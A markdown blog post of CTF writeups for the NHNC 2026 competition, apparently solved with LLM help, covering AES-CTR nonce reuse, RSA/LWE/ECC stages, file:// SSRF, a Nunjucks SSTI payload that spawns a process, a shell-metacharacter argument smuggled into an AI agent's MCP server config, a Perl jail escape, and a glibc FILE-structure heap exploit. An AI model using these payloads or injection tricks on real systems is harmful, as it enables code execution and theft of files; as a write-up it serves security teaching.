@@ -1,0 +1,540 @@
+---
+tags: [ctf, writeup, nhnc, security]
+publishedAt: 2026-07-06
+---
+
+# NHNC 2026 Writeups
+
+## Where do I know this event
+
+One of my friend in icedtea ask me if I can use LLM to do some challege, so yeah I'm in!  
+**And Yes these challenges are solved by GPT 5.5 and GLM 5.2**
+
+## Final result
+
+40th place, 3478 points, costs $347.73, total 61,855,299 token
+
+### Solves at a glance
+
+| Challenge | Category | Core bug / idea |
+| --- | --- | --- |
+| Newbie Crypto | crypto | AES-CTR key/nonce reuse |
+| CRYPTO-400 | crypto | RSA/Coppersmith, LWE-ish leakage, small-order ECC |
+| #include | web | client-only URL validation, backend `file://` file read |
+| Farewell, #include | web | `file://` SSRF + argv injection + Nunjucks SSTI |
+| Confused Component - Web | web | matrix path params route one URL through two interpreters |
+| Confused Component - Rev | rev/web | leaked WASM component embeds a tiny auth VM |
+| Tea-agent | misc/pwn | MCP config launched through a shell |
+| 67 login system | pwn | format-string leaks + heap overflow into fake `_IO_FILE_plus` |
+| CamelRider | jail | Perl diamond operator bypasses blocked `open` |
+| FlagCheckers | rev | obfuscated multiprocess Feistel, inverted statically |
+| Homework | crypto/misc | hidden matrix operation corrupts the secret matrix |
+| Teagod Staff WiFi | protocol | EAP-TLS trusts a mailbox-validated S/MIME certificate |
+
+## Newbie Crypto
+
+The challenge encrypts JSON tickets with AES-CTR:
+
+```python
+KEY = get_random_bytes(16)
+NONCE = b"ticket42"
+
+cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE)
+```
+
+CTR mode is a stream cipher construction. Reusing the same key and nonce means
+all tickets use the same keystream:
+
+```text
+ciphertext = plaintext XOR keystream
+keystream  = plaintext XOR ciphertext
+```
+
+The guest ticket format was public and serialized with compact JSON. One public
+name was long enough to recover every byte needed for the admin ticket, so the
+solve was just:
+
+1. rebuild every guest plaintext exactly with `json.dumps(..., separators=(",", ":"))`;
+2. XOR each guest plaintext with its ciphertext to collect keystream bytes;
+3. XOR the admin ciphertext with that keystream;
+4. parse the decrypted JSON and read `flag`.
+
+Flag:
+
+```text
+NHNC{c7r_k3y57r34m5_5h0uld_n3v3r_r37urn}
+```
+
+## CRYPTO-400
+
+This was a chained multi-stage crypto challenge.
+
+### Stage 1: bit-by-bit RSA leakage
+
+The public output had 896 `(c, N)` pairs, exactly enough to encode a 112-byte
+bitstream. With the provided factors, each RSA modulus can be decrypted:
+
+```text
+d = 65537^-1 mod phi(N)
+r = c^d mod N
+```
+
+The hidden 500-byte key is common across the `1` bits. CRT plus a small-root
+step recovers that key, then each bit is classified by checking whether the
+residue matches:
+
+```text
+bit = 1 if key % N == decrypted_residue else 0
+```
+
+Stage flag:
+
+```text
+NHNC{7h15_15_y0ur_f1r57_f14g_k33p_g01ng_wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww}
+```
+
+### Stage 2: LWE-ish oracle
+
+The service encrypted message `0`. Collecting many samples gives equations of
+the form `b ~= A*s`, so the secret vector `s` can be recovered by least squares.
+After that, each character is decoded with:
+
+```text
+round((b - A*s) / 23)
+```
+
+Stage flag:
+
+```text
+NHNC{53c0nd_f14g_bu7_6767676767676767_41m057_501v3_7h3_ch41_k33p_g01ng_6767676767676767676767}
+```
+
+### Stage 3: small-order elliptic-curve point
+
+The curve was:
+
+```text
+y^2 = x^3 + 2x + 3 mod 607
+```
+
+The point `(134, 138)` has order `5`. Submitting an `n` that is a multiple of
+that order makes the scalar multiplication hit the point at infinity and passes
+the verifier:
+
+```json
+{"x":134,"y":138,"n":1105}
+```
+
+Stage flag:
+
+```text
+NHNC{y0u_c4n_3n73r_7h15_f14g_n0w_4nd_g37_7h3_f1n41_f14g_GG3Z0w0w0w0w0w0w0w0w0w0w0w0w0w0}
+```
+
+Final flag:
+
+```text
+NHNC{c0ngr47u14710n!_y0u_4r3_n0w_c3r71f1c473_45_4_cryp70-400_m4573r<3!!!!!}
+```
+
+## include
+
+The frontend only accepted `http://` and `https://` URLs, but that check lived in
+browser JavaScript. After solving the reCAPTCHA, the token could be reused in the
+same page context and a custom request could be sent directly to `/convert`:
+
+```js
+(async function () {
+  const token = grecaptcha.getResponse();
+  const body = new URLSearchParams();
+  body.set("url", "file:///proc/1/cwd/server.js");
+  body.set("g-recaptcha-response", token);
+
+  const response = await fetch("/convert", { method: "POST", body });
+  const blob = await response.blob();
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "server-js.pdf";
+  a.click();
+})();
+```
+
+The backend did have a `file://` guard, but only for directories:
+
+```js
+if (url.protocol !== 'file:') return false;
+return (await fs.stat(file_url_to_path(url))).isDirectory();
+```
+
+Regular files were still rendered by Headless Chrome. Rendering
+`file:///proc/1/cwd/server.js` leaked the source, and the flag was in that file.
+
+Flag:
+
+```text
+NHNC{Well_done!_stay_tuned_for_the_next_challenge.}
+```
+
+## Farewell, #include
+
+This was the follow-up to `include`. The old `file://` primitive still existed,
+but the real bug chain was longer:
+
+1. `markdown-pdf` wrote rendered markdown to a stable temporary file:
+   `/tmp/output/_temp.html`.
+2. A slow remote image kept Puppeteer alive, so `_temp.html` stayed on disk long
+   enough to race.
+3. `lite-pdf` called percollate with user-controlled tokens split by whitespace.
+4. Supplying `--template=/tmp/output/_temp.html` made percollate compile that
+   file as a Nunjucks template.
+5. The markdown body could contain a Nunjucks expression, so the template became
+   SSTI.
+
+The racing request looked like this:
+
+```text
+POST /convert converter=markdown-pdf url=<hosted markdown SSTI payload>
+POST /convert converter=lite-pdf url="file:///etc/hostname --template=/tmp/output/_temp.html"
+```
+
+The payload used `process.binding('spawn_sync')` because the app was ESM and the
+usual `process.mainModule.require` route was unavailable:
+
+```text
+{{ range.constructor("return (function(){var s=process.binding('spawn_sync').spawn({file:'/readflag',args:['/readflag','give','me','the','flag'],stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]});return 'OUT:'+s.output[1]+' ERR:'+s.output[2]+' STATUS:'+s.status;})()")() }}
+```
+
+The PDF output included:
+
+```text
+OUT:NHNC{Farewell, my friend, promise me you won't find another 0days next time._>>19cfc049197348be9a8c21682169244e} ERR: STATUS:0
+```
+
+Flag:
+
+```text
+NHNC{Farewell, my friend, promise me you won't find another 0days next time._>>19cfc049197348be9a8c21682169244e}
+```
+
+## Confused Component - Web
+
+The key was matrix-style path parameters. One URL was interpreted by two layers:
+
+```http
+GET /assets/manual.css;handler=component;name=auth HTTP/1.1
+```
+
+The previewer treated `/assets/manual.css` as a static data path. The component
+loader treated `name=auth` as a WASM component identifier. The response body was
+the auth component, and the flag was leaked in a response header:
+
+```http
+X-Asset-Normalized-Path: /assets/manual.css
+X-Auth-Engine: wit-component/v2
+X-Web-Flag: NHNC{p4th_1s_n0t_4lw4ys_4_p4th_3a06f1eaab3f4cda9f1969329e9a8ba8}
+```
+
+Flag:
+
+```text
+NHNC{p4th_1s_n0t_4lw4ys_4_p4th_3a06f1eaab3f4cda9f1969329e9a8ba8}
+```
+
+## Confused Component - Rev
+
+The web solve leaked a portable auth component. Inside the component body there
+was a `CCVM1` blob:
+
+```text
+magic:        CCVM1
+u16le:        constants_len
+u16le:        bytecode_len
+bytes:        constants
+bytes:        bytecode
+```
+
+The VM had 8 `uint32` registers, 256 bytes of memory, wrapping arithmetic, and
+returned `memory[:32]` on halt. To forge an admin token:
+
+1. fetch `/api/info` and read `team` plus `server_time`;
+2. derive `nonce = sha256(f"{team}:{server_time}").digest()[:16]`;
+3. canonicalize the admin payload with sorted keys and compact separators;
+4. run the VM over:
+
+```python
+input_material = (
+    sha256(canonical).digest()
+    + nonce
+    + sha256(nonce + canonical + constants[:16]).digest()
+)
+```
+
+5. put the VM's 32-byte output into the `proof` field;
+6. base64url-encode the final canonical JSON and send it as a bearer token.
+
+```http
+GET /admin/flag
+Authorization: Bearer <token>
+```
+
+The exact suffix was instance-specific. One verified instance produced:
+
+```text
+NHNC{t1ny_vm_b1g_tru5t_3a06f1eaab3f4cda9f1969329e9a8ba8}
+```
+
+## Tea-agent
+
+The agent let players upload MCP server config JSON. The intended safe config
+looked like this:
+
+```json
+{"mcpServers":{"memory":{"command":"/app/mcp_memory","args":["--profile=guest","--topic=welcome","--once"]}}}
+```
+
+The bug was that the agent launched the configured command through a shell. The
+filter only required args to look like long options and blacklisted `cat`. This
+arg passed the shape check, avoided `cat`, and still terminated the command:
+
+```json
+{"mcpServers":{"memory":{"command":"/app/mcp_memory","args":["--profile=guest;tee</flag;"]}}}
+```
+
+The shell saw:
+
+```sh
+/app/mcp_memory --profile=guest;tee</flag;
+```
+
+`tee` read `/flag` and echoed it to stdout. The agent helpfully relayed MCP
+stdout back to the socket.
+
+Flag:
+
+```text
+NHNC{N0_W4y_Y0u_pwn_m1ne_4gent_Y0r_are_th3_G0d_0f_4gent_S3curity_06a786bba78642e69448dd27a0e5a0c2}
+```
+
+## 67 login system
+
+The service had four heap-backed login slots and a menu:
+
+```text
+1. register   2. show   3. login   4. update   5. delete   6. exit
+```
+
+Reverse engineering showed three useful properties:
+
+- `show(idx)` did `printf(obj)`, so the username was a format string;
+- `show(idx)` also wrote 0x48 raw bytes, leaking the stored `FILE*` at `obj+0x40`;
+- `update(idx)` read 0x200 bytes into a 0x48-byte object, overflowing into the
+  adjacent `_IO_FILE_plus` object.
+
+The exploit:
+
+1. register `%9$p %11$p\0` to leak PIE and libc;
+2. use the raw dump to recover the heap `FILE*` address;
+3. overwrite the adjacent FILE object with a fake `_IO_FILE_plus`;
+4. set the main vtable to `_IO_wfile_jumps - 0x20`, which is still inside the
+   validated libc IO vtable section;
+5. set the unchecked wide vtable's `__doallocate` slot to `system`;
+6. put `" cat /flag.txt"` at the start of the fake FILE object;
+7. call `login`, which reaches:
+
+```text
+fwrite -> _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE -> system(fp)
+```
+
+The useful offsets for the deployed Arch/glibc 2.43 instance were:
+
+```text
+system          = libc + 0x54100
+_IO_wfile_jumps = libc + 0x211228
+libc leak       = libc + 0x27741
+PIE leak        = pie  + 0x165c
+```
+
+Flag:
+
+```text
+NHNC{0x67676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767_sixseven!!!}
+```
+
+## CamelRider
+
+The prompt looked like a code jail:
+
+```text
+Welcome to Camel Rider!
+Type ur code
+>
+```
+
+Tiny probes gave away Perl:
+
+```text
+print([1,2,3]) -> ARRAY(...)
+print((1,2,3)) -> 123
+```
+
+String literals and obvious builtins like `open`, `system`, and `readpipe` were
+blocked, but `chr(...)`, variables, and Perl's diamond operator were allowed.
+The diamond operator reads files listed in `@ARGV`, so this avoided the literal
+word `open` entirely:
+
+```perl
+@ARGV=(chr(102).chr(108).chr(97).chr(103).chr(46).chr(116).chr(120).chr(116));print(<>)
+```
+
+That constructs `flag.txt`, assigns it to `@ARGV`, and prints the file through
+`<>`.
+
+Latest verified flag in the playground:
+
+```text
+NHNC{Yf8fnibf5fhiqfwbqubkmoyt3191qv3r1}
+```
+
+## FlagCheckers
+
+The binary tried hard to look annoying: stripped, statically linked x86-64,
+manual syscalls, `fork`, `futex`, shared anonymous `mmap`, and junk sequences to
+confuse linear disassembly.
+
+The multiprocessing was noise. The core was a 15-round Feistel cipher over 17
+chained 8-byte blocks. The `.data` section contained everything needed:
+
+```text
+0x402020  T constants, XOR-masked with 0xa5a5a5a5
+0x402080  S-box 0
+0x402180  S-box 1
+0x402280  S-box 2
+0x402380  S-box 3
+0x402480  136-byte target table
+```
+
+The block function was:
+
+```text
+X = bswap64(P8) XOR K_b
+H = X >> 32
+L = X & 0xffffffff
+for k in 0..14:
+    newH = L
+    newL = H XOR f_k(L XOR rc_k)
+K_{b+1} = (H << 32) | L
+```
+
+The target table was literally `K_1..K_17`, so inversion was direct. For each
+block, take the target key, walk the Feistel rounds backwards, XOR with the
+previous key, and undo the `bswap64`.
+
+The initial key was:
+
+```text
+K_0 = 0x0f1e2d3c4b5a6978
+```
+
+Flag:
+
+```text
+NHNC{2b06cc91a6d35aa24e886394ab574e1c4b4f9eed7ad6d7aca7a3228a39cf318f0a3c523a72263b0995f6417f3b5fd56443d482fbd9b430a578c4038a451028b9}
+```
+
+## Homework
+
+The service accepted matrices and later used a hidden 2x2 matrix `A` to encrypt a
+random prompt string `T`. The menu exposed normal operations, but there was also
+a hidden operation:
+
+```text
+blend <shift>
+```
+
+For 1x1 matrices, debug output showed that `Y[0][0]` was three `Real` slots
+before hidden `A[0][1]`. `blend` computed `Y * (X + 1)` and wrote it with the
+supplied slot shift, so the payload overwrote `A[0][1]`:
+
+```text
+1 1
+1 1
+0
+1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+blend 3
+```
+
+That set `b = A[0][1] = 10^90`, which still passed validation. The service then
+printed enough values to reconstruct most of the matrix:
+
+```text
+A = [[p + q, b],
+     [c,     p - q]]
+
+p = (a_plus_d) / 2
+c = bc / b
+```
+
+Only `q` remained unknown. For a candidate `q`, compute `A(q)^n`, invert each
+ciphertext point, and check whether the first coordinate is printable. The solver
+used a secant search per possible first character and sent the recovered `T` back
+to the service.
+
+Flag:
+
+```text
+NHNC{y0u_c4nt_di4g0n4l1z3_y0ur_w4y_0ut_0f_h0m3w0rk_5465d1bcd2d3494ebaeb4eb3bb962705}
+```
+
+## Teagod Staff WiFi
+
+The endpoint was a RADIUS service speaking EAP:
+
+```text
+udp://tearoam.teagod.tech:18120
+```
+
+The service accepted EAP-TLS client authentication using a publicly issued
+Actalis S/MIME mailbox-validated certificate. That is the entire bug: a cert that
+proves control of an email inbox should not be accepted as enterprise Wi-Fi
+identity unless CA, EKU, policy OIDs, subject constraints, and identity mapping
+are all scoped tightly.
+
+The solver implemented enough RADIUS/EAP to drive the handshake:
+
+1. send `Access-Request` with `EAP-Response/Identity`;
+2. receive the server's method proposal;
+3. send `EAP-NAK` requesting EAP-TLS (`13`);
+4. fragment TLS records into `EAP-Message` attributes;
+5. complete TLS 1.2 with the Actalis `.p12` client certificate;
+6. read `Reply-Message` from the final `Access-Accept`.
+
+The RADIUS `Message-Authenticator` had to be correct:
+
+```python
+mac = hmac.new(secret, packet_with_zeroed_message_authenticator, hashlib.md5).digest()
+```
+
+The shared secret was `testing123`.
+
+Flag:
+
+```text
+NHNC{Huh...HoW_did_U_10g_iN?_https://zeroday.hitcon.org/vulnerability/ZD-2025-00549}
+```
+
+## Notes I did not publish as solves
+
+These folders existed in the playground, but I did not treat them as solved
+writeups because the artifacts did not contain a real verified flag or the state
+was clearly incomplete:
+
+- `GuessyCTF/`: only the challenge description and hints were present.
+- `login_page/`: only a local `NHNC{TEST_FLAG}`-style fixture was visible.
+- `Mango/`: the ObjectId/GraphQL timing idea was documented and locally verified
+  with `NHNC{TEST_ME}`, but the remote flag was not captured.
+- `TEARoam/`: the notes had a Coppersmith-to-forged-RadSec attack path and local
+  placeholders, but no real challenge flag.
+- `whois/`: exploit scripts documented a Redis `whois` argv injection into Jinja
+  SSTI, but no captured flag string was in the artifacts.
+- `watching_tv/` and `Wotagei/`: mostly binaries, videos, images, and OSINT sweep
+  artifacts; no final NHNC flag was present in the text files I checked.
